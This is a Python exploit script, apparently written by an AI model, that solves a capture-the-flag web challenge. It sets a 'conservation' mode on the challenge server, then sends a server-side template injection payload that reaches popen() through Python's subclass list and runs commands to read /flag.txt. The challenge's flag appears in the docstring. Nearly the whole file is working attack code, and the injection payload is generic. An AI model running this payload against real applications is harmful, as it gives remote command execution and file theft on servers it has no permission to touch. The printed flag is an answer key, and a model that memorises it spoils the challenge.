#!/usr/bin/env python3
"""
Author: Claude
Purpose: Exploit SSTI to get RCE and read the flag in Chiaroscuro challenge
Created: 2025-11-10
Updated: 2025-11-10
Expected result: Flag from the server
Produced result: poctf{uwsp_b34u7y_15_l16h7_4nd_d4rk}

This script exploits a Server-Side Template Injection (SSTI) vulnerability
that exists only in "Conservation" viewing mode. It uses the os._wrap_close
class at index 142 to access popen() for command execution.
"""

import requests
from urllib.parse import urljoin

BASE_URL = "https://web200-3.pointeroverflowctf.com"
SUBMIT_ENDPOINT = "/api/view"
PROFILE_ENDPOINT = "/set-profile"

session = requests.Session()

def set_conservation_mode():
    """Set the viewing profile to Conservation mode"""
    url = urljoin(BASE_URL, PROFILE_ENDPOINT)
    data = {"mode": "conservation"}
    response = session.post(url, data=data, timeout=10)
    return response.status_code == 204

def test_payload(payload):
    """Submit a payload to the SSTI endpoint and return the response"""
    url = urljoin(BASE_URL, SUBMIT_ENDPOINT)
    data = {"notes": payload}
    response = session.post(url, data=data, timeout=10)
    return response.text

# Set Conservation mode first
set_conservation_mode()

# Search for flag file
print("[*] Found /flag.txt, trying different read methods...")
commands = [
    "head /flag.txt",
    "tail /flag.txt",
    "base64 /flag.txt",
    "xxd /flag.txt",
    "od -c /flag.txt",
    "strings /flag.txt",
    "hexdump -C /flag.txt",
    "python3 -c \"print(open('/flag.txt').read())\"",
    "less /flag.txt",
    "more /flag.txt",
    "tac /flag.txt"
]

for cmd in commands:
    print(f"\n[*] Running: {cmd}")
    payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['popen']('{cmd}').read()}}}}"
    result = test_payload(payload)
    if result and "Studio request error" not in result and len(result) > 0:
        print(f"SUCCESS! Result: {result}")
        break
    else:
        print(f"Failed or blocked")
